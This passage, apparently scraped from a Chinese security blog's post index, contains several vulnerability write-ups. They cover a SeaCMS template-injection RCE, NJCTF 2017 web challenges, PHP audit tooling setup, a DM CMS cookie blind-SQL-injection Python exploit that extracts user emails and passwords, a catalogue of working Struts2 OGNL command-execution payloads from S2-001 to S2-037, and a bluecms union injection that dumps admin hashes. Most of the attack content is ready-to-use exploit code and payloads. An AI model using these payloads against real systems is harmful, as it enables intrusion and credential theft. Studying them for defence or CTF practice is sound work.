if}标签代码，可以看到没有做任何处理就eval，那么我们查找一下对应调用的地方会不会有漏洞。主要关注前台，找到一处解析搜索结果的页面（search.php），代码比较多，一点一点来看。找到调用的位置line 212$content=$mainClassObj-&gt;parseIf($content);往上看，发现他的逻辑是先解析其他类型的标签，比如{searchpage:page}那么接下来的思路，主要是2点，查找对应if标签可控的位置，另一种就是查找其他标签的可控内容，写入if标签我找到一处其他标签可控且没有做任何处理的位置，直接写入if标签语句即可造成任意代码执行1234567891011121314function echoSearchPage()&#123; global $dsql,$cfg_iscache,$mainClassObj,$page,$t1,$cfg_search_time,$searchtype,$searchword,$tid,$year,$letter,$area,$yuyan,$state,$ver,$order,$jq,$money,$cfg_basehost; $order = !empty($order)?$order:time;.........$content = str_replace(&quot;&#123;searchpage:page&#125;&quot;,$page,$content); $content = str_replace(&quot;&#123;seacms:searchword&#125;&quot;,$searchword,$content); $content = str_replace(&quot;&#123;seacms:searchnum&#125;&quot;,$TotalResult,$content); $content = str_replace(&quot;&#123;searchpage:ordername&#125;&quot;,$order,$content);......... order变量可控并且在调用parseIf函数前先解析，所以我们可以通过order写入if标签。查看一下具体html代码1234567&lt;div class=&quot;btn-toolbar&quot; role=&quot;toolbar&quot;&gt; &lt;div class=&quot;btn-group&quot;&gt; &lt;a href=&quot;&#123;searchpage:order-time-link&#125;&quot; &#123;if:&quot;&#123;searchpage:ordername&#125;&quot;==&quot;time&quot;&#125; class=&quot;btn btn-success&quot; &#123;else&#125; class=&quot;btn btn-default&quot; &#123;end if&#125; id=&quot;orderhits&quot;&gt;最新上映&lt;/a&gt; &lt;a href=&quot;&#123;searchpage:order-hit-link&#125;&quot; &#123;if:&quot;&#123;searchpage:ordername&#125;&quot;==&quot;hit&quot;&#125; class=&quot;btn btn-success&quot; &#123;else&#125; class=&quot;btn btn-default&quot; &#123;end if&#125; id=&quot;orderaddtime&quot;&gt;最近热播&lt;/a&gt; &lt;a href=&quot;&#123;searchpage:order-score-link&#125;&quot; &#123;if:&quot;&#123;searchpage:ordername&#125;&quot;==&quot;score&quot;&#125; class=&quot;btn btn-success&quot; &#123;else&#125; class=&quot;btn btn-default&quot; &#123;end if&#125; id=&quot;ordergold&quot;&gt;评分最高&lt;/a&gt; &lt;/div&gt; &lt;/div&gt; 那么接下来就可以构造poc了，类似sql注入，我们先把前面的if标签语句闭合，写入恶意代码并闭合后面的if标签。example：}{end if}{if:1)phpinfo();if(1}{end if}本地验证一下 总结这是一个比较经典的漏洞，也可以被称为模版解析吧我觉得：）ps: 后悔啊，没有先提交个poc平台T_T"},{"title":"【CTF】NJCTF2017 writeup","permalink":"http://blog.0kami.cn/2017/03/15/old-njctf-2017/","text":"概述辞职后没事情干，刚好赶上njctf，还是一样菜啊，只做了7道题，还要继续努力💪（ps:毕业设计什么鬼啊）写一下web的writeup，由于题目还开着，把没做出来的做一遍，纪录一下我觉得有必要记的题 Web题Login（100）好吧，这道题取了巧，谁让大黑客们都是弱密码呢！！！！由于没有做验证码机制，所以扫了一波弱口令，然后…然后就进去啦其实这道题考的是mysql的长度限制漏洞。利用2个mysql的特性 当数据超过建表时的规定的数据大小，mysql将超过的部分截断 当select时where查询字句中的数据如果最后以空格结尾，mysql默认将空格去除查询那么利用这2个特性，我们只要注册一个admin+N*%20+x就可以已admin登陆，然后getflag：NJCTF{4R3_Y0u_7H3_Re41_aDM1N?} Get Flag(100)这道题考了命令执行漏洞首先发现存在文件任意读取漏洞，那么尝试读取一下源码，最后试出来是app.py可以看到有个命令执行并且是可控的，但是过滤了一些字符，用&amp;就可以绕过。ls 查看一下可以看到flag文件9iZM2qTEmq67SOdJp%!oJm2%M4!nhS_thi5_flagcat一波，这里的特殊字符转移是关键 come on(200)具体看大佬们的writeup即可，这道题主要学到了其盲注的注入方式。binary函数用来区分大小写 12345select xxx from xxx like x%select xxx from xxx like xx%select xxx from xxx like xxx%select xxx from xxx like xxxx%... 通过like来住出数据 Be Admin(300)首先发现有.bak文件，下下来看一下,发现这道题主要考的是cbc字节翻转攻击和padding oracle attack.首先由于登陆出存在注入，我们可以把数据中的encrypt_pass取出来登陆绕过可以通过php弱类型比较来绕过，admin／0即可登陆要通过cbc字节翻转必须知道defaultId的值，所以我们需要先跑出defaultId的值padding oracle attack参考padding oracle attack符合我们现在的情况： 已知真实IV 已知对应cipher text 当解密失败ERROR错误题目环境可能坏了，本地搭一下，跑一下中间值需要注意的一点是padding oracle attack第一个字符没办法跑出来，由于最后一个字符解出来是空白所以还是error，不过没关系暴力一遍就好了（ps：有了原理，写代码很容易，就不放代码了） 总结欠缺的还是很多，继续💪"},{"title":"【OTHERS】php代码审计前的准备","permalink":"http://blog.0kami.cn/2017/02/03/old-code-review-pre-prepare/","text":"概述所谓“工欲善其事,必先利其器”，在代码审计前，我们需要准备提高我们审计效率的工具。 环境 Mac xampp(可以用phpstudy或者是其他集成环境代替) Navicat Premium(个人认为Mac下最好的数据库管理工具，学生党只能用**,有能力尽量支持正版) phpstorm(这里的IDE用的是我自己比较习惯的，也可以使用其他你比较熟悉的) xdebug(用来动态调试) 终端 浏览器(firefox、chrome,这里使用firefox,hackbar是个好东西) 安装上述的软件之类的就不说了，下文主要是动态调试环境搭建。 动态调试环境php添加xdebug配置xampp的php.ini位于/install/path/etc/php.ini，在配置文件最后添加上 1234567891011[xdebug]zend_extension=/Applications/XAMPP/xamppfiles/lib/php/extensions/no-debug-non-zts-20131226/xdebug.soxdebug.remote_autostart=onxdebug.remote_enable=onxdebug.remote_enable=1xdebug.remote_mode=&quot;req&quot;xdebug.remote_log=&quot;/var/log/xdebug.log&quot;xdebug.remote_host=localhost/127.0.0.1xdebug.remote_port=9000xdebug.remote_handler=&quot;dbgp&quot;xdebug.idekey=&quot;PhpStorm&quot; so文件是xampp自带的，mac下的配置可以直接copy我的保存后重启apache firefox安装xdebug扩展firefox下的xdebug扩展叫 the easiest xdebug，搜索一下安装安装完成后点亮工具栏上的甲虫，开启调试设置key,更php配置文件中相同 配置phpstorm打开Preferences-&gt;Languages&amp;Framework-&gt;php如图设置servers，接着设置debug下的DBGp Proxy设置完成后在工具栏处找到edit Configurations新增php web application接下来就可以愉快的下断点，动态调试了 mysql执行审计监控在navicat或终端中运行以下2句 set global general_log=on;set global log_output=’table’; 查看mysql.general_log表可以看到运行过的sql语句，方便我们查询win下可以用seay的代码审计工具，带了mysql的sql监控 终端终端主要用到了grep这个工具，网上有很多相关的教材。主要匹配输入输出点，危险函数等等具体的以后有空了再补充 总结记录一下过程，以后能看看，愉快的代码审计吧:P"},{"title":"【Code Review】DM企业建站系统前台盲注","permalink":"http://blog.0kami.cn/2017/01/29/old-DM-sql-injection/","text":"概述今天搞了一下动态调试的东西，然后顺便看了看上次下的DM企业建站系统2017.01.23。 前台cookie 时间盲注大致跟了一下几个入口文件，该套cms主要的安全措施为htmlentities，在POST&amp;&amp;GET的输入点做了html实体化的操作，但是这并不转义单引号（默认不转义单引号具体可看htmlentities），看了一下进行数据库查询的sql语句，涉及到字符串类型时，都是单引号闭合，那么很清楚，在进行数据库查询时容易产生sql注入漏洞。那么接下来主要找一下进行数据库操作的位置。 POST&amp;&amp;GET COOKIE ps：这里就随便找了一个地方，因为这套系统注入不要太多，连后台登陆都可以 :P 前面提到对POST&amp;&amp;GET做了实体转义，但是grep找了一下cookie，发现并没有对cookie的值进行安全操作，直接带入数据库查询。indexDM_load.php Line 108 12345678910111213...if(@$_COOKIE[&quot;curstyle&quot;]&lt;&gt;&apos;&apos;) $curstyle = $_COOKIE[&quot;curstyle&quot;];else $curstyle = $row[&apos;curstyle&apos;]; ...$sqlstyle = &quot;SELECT * from &quot;.TABLE_STYLE.&quot; where pidname=&apos;$curstyle&apos; $andlangbh limit 1&quot;; //echo $sqlstyle;exit;if(getnum($sqlstyle)&gt;0)&#123; $rowstyle = getrow($sqlstyle); 上述为漏洞的主要成因点，如果cookie中存在curstyle,优先选用cookie中的值，然后带入数据库查询。由于没有找到具体回显数据的地方，所以采用时间盲注的方式获取数据。 带上自己写的EXP 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879#!/usr/bin/env python# -*- coding: utf-8 -*-# Created by wh1t3P1g at 2017/1/30import requests,timeclass CookieBlindSqlInjection: def __init__(self,url): self.url=url self.len=0 def getLength(self,column,table): payload0 = &quot;curstyle=1&apos;||if((select length(cast(bin(length(&#123;column&#125;)) as char)) from &#123;table&#125; limit &#123;line_start&#125;,1)=&#123;flag&#125;,sleep(5),1)=1#&quot; payload1 = &quot;curstyle=1&apos;||if((select substr(bin(length(&#123;column&#125;)),&#123;col_start&#125;,1) from &#123;table&#125; limit &#123;line_start&#125;,1)=1,1,sleep(5))=1#&quot; #first confirm bin-format data length len=0 for i in range(1,9): cookie=payload0.format(column=column,table=table,line_start=0,flag=i) flag=self.send(cookie) if flag==&quot;0&quot;: len=i break res=&quot;&quot; for i in range(1,len+1): cookie=payload1.format(column=column,col_start=i,table=table,line_start=0) flag=self.send(cookie) res+=flag # print res self.len=int(res,2) pprint(&quot;*&quot;, &quot;fetch &quot;+column+&quot; length: &quot;+str(self.len)) return int(res,2) def getData(self,column,table): payload0=&quot;curstyle=1&apos;||if((select length(cast(bin(ascii(substr(&#123;column&#125;,&#123;data_start&#125;,1))) as char)) from &#123;table&#125; limit &#123;line_start&#125;,1)=&#123;flag&#125;,sleep(5),1)=1#&quot; payload1 = &quot;curstyle=1&apos;||if((select substr(bin(ascii(substr(&#123;column&#125;,&#123;data_start&#125;,1))),&#123;col_start&#125;,1) from &#123;table&#125; limit &#123;line_start&#125;,1)=1,1,sleep(5))=1#&quot; total_res=&quot;&quot; for i in range(1,self.len+1):#具体数据的长度 len = 0 for j in range(1, 9): cookie = payload0.format(column=column,data_start=i, table=table, line_start=0, flag=j) flag = self.send(cookie) if flag == &quot;0&quot;: len = j break # print &quot;len:&quot;+str(len) res = &quot;&quot; for k in range(1, len + 1): cookie = payload1.format(column=column,data_start=i, col_start=k, table=table, line_start=0) flag = self.send(cookie) res += flag # print res total_res+=chr(int(res,2)) pprint(&quot;*&quot;, &quot;fetch &quot;+column+&quot;: &quot;+total_res) return total_res def send(self,cookie): headers=&#123;&quot;Cookie&quot;:cookie&#125; try: r = requests.get(self.url, headers=headers,timeout=4) return &quot;1&quot; except: return &quot;0&quot;def pprint(flag,content): print &quot;[&#123;flag&#125;] [&#123;time&#125;] &#123;content&#125;&quot; \\ .format(flag=flag, time=time.asctime(time.localtime(time.time())), content=content)if __name__==&apos;__main__&apos;: cookieBlindSqlInjection=CookieBlindSqlInjection(&quot;http://127.0.0.1/cms/DM/20170123/&quot;) pprint(&quot;*&quot;,&quot;program start&quot;) pprint(&quot;*&quot;, &quot;start fetching column[email]&quot;) cookieBlindSqlInjection.getLength(&quot;email&quot;,&quot;zzz_user&quot;) email=cookieBlindSqlInjection.getData(&quot;email&quot;,&quot;zzz_user&quot;) pprint(&quot;*&quot;, &quot;start fetching column[ps]&quot;) cookieBlindSqlInjection.getLength(&quot;ps&quot;, &quot;zzz_user&quot;) ps=cookieBlindSqlInjection.getData(&quot;ps&quot;, &quot;zzz_user&quot;) pprint(&quot;*&quot;, &quot;[email]: &quot;+email+&quot; ,[ps]: &quot;+ps) pprint(&quot;*&quot;, &quot;program done&quot;) ps:DM这个鬼，代码写的好乱啊T_T"},{"title":"【VULNERABLITY】Struts2命令执行各版本记录","permalink":"http://blog.0kami.cn/2017/01/13/old-Struts2-history-payload/","text":"概述最近在写Struts2的一些PoC，记录一下各个版本的PoC方便到时候查阅。先提一下参考的前辈们的网址，感谢🙏 http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html http://www.cnblogs.com/LittleHann/p/4606891.html https://cwiki.apache.org/confluence/display/WW/S2-xxx http://blog.nsfocus.net/tech/%E7%83%AD%E7%82%B9%E8%B7%9F%E8%B8%AA/2016/06/16/Struts2-S2-037(CVE-2016-4438)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html https://cwiki.apache.org/confluence/display/WW/S2-009 Struts2命令执行集合下文不是具体的分析文，能力有限，仅记录一下以做将来复习查用。过段时间会将所有的漏洞环境上传到github上，环境来源大部分为我偶像rickgray博客上共享的以及官网上下的对应版本的示例环境。update:2017/1/16 环境地址 Struts2 S2-001影响版本：2.0.0 - 2.0.8 具体详情：https://struts.apache.org/docs/s2-001.html 该漏洞因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %{value} 进行解析，然后重新填充到对应的表单数据中。例如注册或登录页面，提交失败后端一般会默认返回之前提交的数据，由于后端使用 %{value} 对提交的数据执行了一次 OGNL 表达式解析，所以可以直接构造 Payload 进行命令执行 上文引用rickgray的描述。 构造PoC获取tomcat执行路径1%&#123;&quot;tomcatBinDir&#123;&quot;+@java.lang.System@getProperty(&quot;user.dir&quot;)+&quot;&#125;&quot;&#125; 获取web根目录1%&#123;#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#response.println(#req.getRealPath(&apos;/&apos;)),#response.flush(),#response.close()&#125; 执行系统命令1%&#123;#a=(new java.lang.ProcessBuilder(&quot;whoami&quot;)).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#matt.getWriter().println(new java.lang.String(#e)),#matt.getWriter().flush(),#matt.getWriter().close()&#125; Struts2 S2-005影响版本: 2.0.0 - 2.1.8.1 漏洞详情: http://struts.apache.org/docs/s2-005.html struts2漏洞的起源源于S2-003(受影响版本: 低于Struts 2.0.12)，struts2会将http的每个参数名解析为ongl语句执行(可理解为java代码)。ongl表达式通过#来访问struts的对象，struts框架通过过滤#字符防止安全问题，然而通过unicode编码(\\u0023)或8进制(\\43)即绕过了安全限制，对于S2-003漏洞，官方通过增加安全配置(禁止静态方法调用和类方法执行等)来修补，但是安全配置被绕过再次导致了漏洞，攻击者可以利用OGNL表达式讲这2个选项打开，S2-003的修补方案把自己上了一个锁，但是把锁钥匙给插在了锁头上 上文引用LittleHann的描述 构造PoC获取web根目录1(&apos;\\43_memberAccess.allowStaticMethodAccess&apos;)(a)=true&amp;(b)((&apos;\\43context[\\&apos;xwork.MethodAccessor.denyMethodExecution\\&apos;]\\75false&apos;)(b))&amp;(&apos;\\43c&apos;)((&apos;\\43_memberAccess.excludeProperties\\75@java.util.Collections@EMPTY_SET&apos;)(c))&amp;(g)((&apos;\\43req\\75@org.apache.struts2.ServletActionContext@getRequest()&apos;)(d))&amp;(i2)((&apos;\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse()&apos;)(d))&amp;(i97)((&apos;\\43xman.getWriter().println(\\43req.getRealPath(%22\\u005c%22))&apos;)(d))&amp;(i99)((&apos;\\43xman.getWriter().close()&apos;)(d)) 执行系统命令1(&apos;\\43_memberAccess.allowStaticMethodAccess&apos;)(a)=true&amp;(b)((&apos;\\43context[\\&apos;xwork.MethodAccessor.denyMethodExecution\\&apos;]\\75false&apos;)(b))&amp;(&apos;\\43c&apos;)((&apos;\\43_memberAccess.excludeProperties\\75@java.util.Collections@EMPTY_SET&apos;)(c))&amp;(g)((&apos;\\43mycmd\\75\\&apos;&quot;+cmd+&quot;\\&apos;&apos;)(d))&amp;(h)((&apos;\\43myret\\75@java.lang.Runtime@getRuntime().exec(\\43mycmd)&apos;)(d))&amp;(i)((&apos;\\43mydat\\75new\\40java.io.DataInputStream(\\43myret.getInputStream())&apos;)(d))&amp;(j)((&apos;\\43myres\\75new\\40byte[51020]&apos;)(d))&amp;(k)((&apos;\\43mydat.readFully(\\43myres)&apos;)(d))&amp;(l)((&apos;\\43mystr\\75new\\40java.lang.String(\\43myres)&apos;)(d))&amp;(m)((&apos;\\43myout\\75@org.apache.struts2.ServletActionContext@getResponse()&apos;)(d))&amp;(n)((&apos;\\43myout.getWriter().println(\\43mystr)&apos;)(d)) 上面2个PoC摘自k8team，为了写PoC，有所改动，但是这里就不贴上来了：） Struts2 S2-009影响版本: 2.0.0 - 2.3.1.1 漏洞详情: https://struts.apache.org/docs/s2-009.html 漏洞利用点跟S2-003和S2-005类似，利用OGNL表达式(1)(2),会执行1的OGNL表达式，009构造了的方法为test=(some OGNL 表达式)(1)&amp;z[(test)(1)]=true。z[(test)(1)]=true,对struts2来说是合法的参数，但是(test)(1)会执行上述说的方法，test的值被带入计算，造成命令执行。 构造PoC弹计算器ps:实验环境试了好几次都不能执行系统命令，路过的大佬求指教：） 1person.name=(#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]= new java.lang.Boolean(false), #_memberAccess[&quot;allowStaticMethodAccess&quot;]= new java.lang.Boolean(true), @java.lang.Runtime@getRuntime().exec(&apos;open /Applications/Calculator.app&apos;))(meh)&amp;z[(person.name)(&apos;meh&apos;)]=true 用的是person/new-person.action这个控制器 获取web根目录1person.name=%28%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%20new%20java.lang.Boolean%28false%29%2C%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23req%3D@org.apache.struts2.ServletActionContext@getRequest%28%29%2C%23outstr%3D@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%2C%23outstr.println%28%27webpath%3A%27%2b%23req.getRealPath%28%22%2f%22%29%29%2C%23outstr.close%28%29%29%28meh%29&amp;z%5B%28person.name%29%28%27meh%27%29%5D&quot; Struts2 S2-012影响版本: 2.0.0 - 2.3.13 漏洞详情: https://cwiki.apache.org/confluence/display/WW/S2-012 Action 中 Result 时使用了重定向类型，并且还使用 ${param_name} 作为重定向变量,struts在获取其值时会执行OGNL表达式，从而造成命令执行 构造PoC获取web根路径1%25%7B%28%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%29%28%23_memberAccess%5B%27allowStaticMethodAccess%27%5D%3Dtrue%29%28%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23response%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%2C%23response.println%28%27webpath%3A%27%2b%23req.getSession%28%29.getServletContext%28%29.getRealPath%28%27%2f%27%29%29%2C%23response.flush%28%29%2C%23response.close%28%29%29%7D 执行系统命令1%25%7B%28%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%29%28%23_memberAccess%5B%27allowStaticMethodAccess%27%5D%3Dtrue%29%28%23a%3D%28new%20java.lang.ProcessBuilder%28%27whoami%27%29%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew%20java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew%20java.io.BufferedReader%28%23c%29%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read%28%23e%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%27dbapp%3A%27%2bnew%20java.lang.String%28%23e%29%29%2C%23matt.getWriter%28%29.flush%28%29%2C%23matt.getWriter%28%29.close%28%29%29%7D%0A%0A Struts2 S2-013/S2-014影响版本: 2.0.0 - 2.3.14.1 漏洞详情: https://cwiki.apache.org/confluence/display/WW/S2-013,https://cwiki.apache.org/confluence/display/WW/S2-014 标签s:url和s:a中提供include参数，其参数值可以为 none - include no parameters in the URL (default) get - include only GET parameters in the URL all - include both GET and POST parameters in the URL 如果参数值为get或all，在获取对应的参数值时执行了OGNL表达式 构造PoC获取web根目录1a=$&#123;(%23_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23out.println(&apos;webpath%3a&apos;%2b%23req.getRealPath(&quot;/&quot;)),%23out.close())&#125; 执行系统命令1a=$&#123;(%23_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,%23a=@java.lang.Runtime@getRuntime().exec(&apos;&quot;+cmd+&quot;&apos;).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[50000],%23c.read(%23d),%23out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23out.println(&apos;dbapp%3a&apos;%2bnew java.lang.String(%23d)),%23out.close())&#125; Struts2 S2-016影响版本: 2.0.0 - 2.3.15 漏洞详情: https://struts.apache.org/docs/s2-016.html DefaultActionMapper 类支持以 action:，redirect: 和 redirectAction: 作为访问前缀，前缀后面可以跟 OGNL 表达式，由于 Struts2 未对其进行过滤，导致任意 Action 可以使用这些前缀执行任意 OGNL 表达式，从而导致任意命令执行 上文引用rickgray的描述。 构造PoC获取web根目录1?redirect:$&#123;#req=#context.get(&apos;co&apos;+&apos;m.open&apos;+&apos;symphony.xwo&apos;+&apos;rk2.disp&apos;+&apos;atcher.HttpSer&apos;+&apos;vletReq&apos;+&apos;uest&apos;),#resp=#context.get(&apos;co&apos;+&apos;m.open&apos;+&apos;symphony.xwo&apos;+&apos;rk2.disp&apos;+&apos;atcher.HttpSer&apos;+&apos;vletRes&apos;+&apos;ponse&apos;),#resp.setCharacterEncoding(&apos;UTF-8&apos;),#ot=#resp.getWriter (),#ot.print(&apos;web&apos;),#ot.print(&apos;path:&apos;),#ot.print(#req.getSession().getServletContext().getRealPath(&apos;/&apos;)),#ot.flush(),#ot.close()&#125; 执行系统命令1?redirect:$&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&apos;whoami&apos;&#125;)).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get(&apos;co&apos;+&apos;m.ope&apos;+&apos;nsymph&apos;+&apos;ony.x&apos;+&apos;wor&apos;+&apos;k2.disp&apos;+&apos;atch&apos;+&apos;er.HttpSe&apos;+&apos;rvletRe&apos;+&apos;sponse&apos;),#matt.getWriter().println(new java.lang.String(#e)),#matt.getWriter().flush(),#matt.getWriter().close()&#125;&apos; 还有一种比较隐蔽的方法，将PoC放在文件上传的name处，过waf。 Struts2 S2-019影响版本: 2.0.0 - 2.3.15.1 漏洞详情: https://cwiki.apache.org/confluence/display/WW/S2-019 该漏洞成因为开启了开发者模式，传入debug=command&amp;expression=导致执行OGNL表达式，从而造成命令执行漏洞。 构造PoC获取web根路径1debug=command&amp;expression=%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23resp%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23resp.setCharacterEncoding%28%27UTF-8%27%29%2C%23resp.getWriter%28%29.println%28%27webpath%3A%27%2b%23req.getSession%28%29.getServletContext%28%29.getRealPath%28%27%2f%27%29%29%2C%23resp.getWriter%28%29.flush%28%29%2C%23resp.getWriter%28%29.close%28%29 执行系统命令1debug=command&amp;expression=%23a%3D%28new%20java.lang.ProcessBuilder%28%27whoami%27%29%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew%20java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew%20java.io.BufferedReader%28%23c%29%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read%28%23e%29%2C%23out%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23out.getWriter%28%29.println%28%27dbapp%3A%27%2bnew%20java.lang.String%28%23e%29%29%2C%23out.getWriter%28%29.flush%28%29%2C%23out.getWriter%28%29.close%28%29%0A Struts2 S2-032影响版本: 2.3.20 - 2.3.28 (except 2.3.20.3 and 2.3.24.3) 漏洞详情: https://struts.apache.org/docs/s2-032.html 在配置了 Struts2 DMI 为 True 的情况下，可以使用 method: Action 前缀去调用声明为 public 的函数，DMI 的相关使用方法可参考官方介绍（Dynamic Method Invocation），这个 DMI 的调用特性其实一直存在，只不过在低版本中 Strtus2 不会对 name 方法值做 OGNL 计算，而在高版本中会，代码详情可参考阿尔法实验室的报告 - 《Apache Struts2 s2-032技术分析及漏洞检测脚本》 上文引用rickgray的描述。 构造PoC获取web根目录1?method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#req=#context.get(#parameters.a[0]),#resp=#context.get(#parameters.b[0]),#resp.setCharacterEncoding(#parameters.c[0]),#ot=#resp.getWriter (),#ot.print(#parameters.e[0]+#req.getSession().getServletContext().getRealPath(#parameters.d[0])),#ot.flush(),#ot.close&amp;a=com.opensymphony.xwork2.dispatcher.HttpServletRequest&amp;b=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;c=UTF-8&amp;d=/&amp;e=webpath: 执行系统命令1?method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#a=(new java.lang.ProcessBuilder(#parameters.a[0])).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get(#parameters.b[0]),#matt.getWriter().println(#parameters.c[0]+new java.lang.String(#e)),#matt.getWriter().flush(),#matt.getWriter().close&amp;a=whoami&amp;b=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;c=flag: Struts2 S2-037影响版本: 2.3.20 - 2.3.28.1 漏洞详情: http://struts.apache.org/docs/s2-037.html 这个漏洞和之前S2-032/033是一个地方，都是在DefaultActionInvocation.java的invokeAction方法中没有对于methodName参数内容进行校验，便直接丢到了getValue方法里面，从而造成Ongl表达式的注入。 上文引用nsfocus%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html)的描述 构造PoC获取web根目录1/(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)?(#req=#context.get(#parameters.a[0]),#resp=#context.get(#parameters.b[0]),#resp.setCharacterEncoding(#parameters.c[0]),#ot=#resp.getWriter (),#ot.print(#parameters.e[0]+#req.getSession().getServletContext().getRealPath(#parameters.d[0])),#ot.flush(),#ot.close):xx.toString.json?&amp;a=com.opensymphony.xwork2.dispatcher.HttpServletRequest&amp;b=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;c=UTF-8&amp;d=/&amp;e=webpath: 执行系统命令1/(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)?(#a=(new java.lang.ProcessBuilder(#parameters.a[0])).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get(#parameters.b[0]),#matt.getWriter().println(#parameters.c[0]+new java.lang.String(#e)),#matt.getWriter().flush(),#matt.getWriter().close()):xx.toString.json?&amp;a=whoami&amp;b=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;c=flag: 总结Struts2命令执行算是一个比较经典的漏洞了，希望以后深入java的一些框架，可以从底层来分析：）"},{"title":"【Code Review】bluecms v1.6 Sql Injection 分析","permalink":"http://blog.0kami.cn/2017/01/11/old-bluecms-v1-6-Sql-Injection/","text":"概述很久没有代码审计了，拿一套简单的找找感觉。bluecms是一套比较老的门户网站cms，网上也有很多关于它的漏洞还未修补，所以下文的漏洞也不算是最新的，仅当是练练手。 SQL注入分析首先关注一下数据的输入 全局数据转义在common.inc.php中 1234567if(!get_magic_quotes_gpc())&#123; $_POST = deep_addslashes($_POST); $_GET = deep_addslashes($_GET); $_COOKIES = deep_addslashes($_COOKIES); $_REQUEST = deep_addslashes($_REQUEST);&#125; 再跟进一下deep_addslashes 123456789101112131415function deep_addslashes($str)&#123; if(is_array($str)) &#123; foreach($str as $key=&gt;$val) &#123; $str[$key] = deep_addslashes($val); &#125; &#125; else &#123; $str = addslashes($str); &#125; return $str;&#125; 可以发现对数据的注入，进行了加斜杠转义的操作。那么接下来找注入思路主要有以下3点： 找整数型注入 整套cms默认gb2312编码，容易造成宽字节注入 http头并不在转义的范围内，所以类似存入ip，reffer的位置也能发生注入 整数型注入拿grep匹配了一下$_GET，找到一处不做其他过滤的整数型位置 1./ad_js.php:$ad_id = !empty($_GET[&apos;ad_id&apos;]) ? trim($_GET[&apos;ad_id&apos;]) : &apos;&apos;; 跟进ad_js.php 12345678$ad_id = !empty($_GET[&apos;ad_id&apos;]) ? trim($_GET[&apos;ad_id&apos;]) : &apos;&apos;;if(empty($ad_id))&#123; echo &apos;Error!&apos;; exit();&#125;$ad = $db-&gt;getone(&quot;SELECT * FROM &quot;.table(&apos;ad&apos;).&quot; WHERE ad_id =&quot;.$ad_id); getone函数 12345function getone($sql, $type=MYSQL_ASSOC)&#123; $query = $this-&gt;query($sql,$this-&gt;linkid); $row = mysql_fetch_array($query, $type); return $row;&#125; 可以看到这里对ad_id没有做其他过滤处理，造成了整数型注入,由于后面会将ad_content打印在页面上，所以直接用union注入就可以获得数据，构造payload 1/ad_js.php?ad_id=1%20union%20select%201,2,3,4,5,6,concat(admin_name,0x23,pwd)%20from%20blue_admin%20limit%201 结果可以在返回的界面中看到 123&lt;!--document.write(&quot;admin#21232f297a57a5a743894a0e4a801fc3&quot;);--&gt; ps:因为该cms错误回显具体sql语句，表前缀可以通过报错的方法把表前缀爆出来。 宽字节注入bluecms操作数据库的具体类定义在mysql.class.php,默认连接时的编码为gbk，我们可以知道当数据库连接时的编码为gbk等双字节编码时，容易发生宽字节注入。前面提到该套cms对数据输入进行了转义的操作，那么刚刚好条件都齐了，必然存在宽字节注入。grep看了一下，基本上的字符串都只是做了转义处理，所以字符串数据输入点都存在宽字节注入。大多数注入都是盲注，没找到具体可以会显数据的地方，这里就简单看一下登陆处 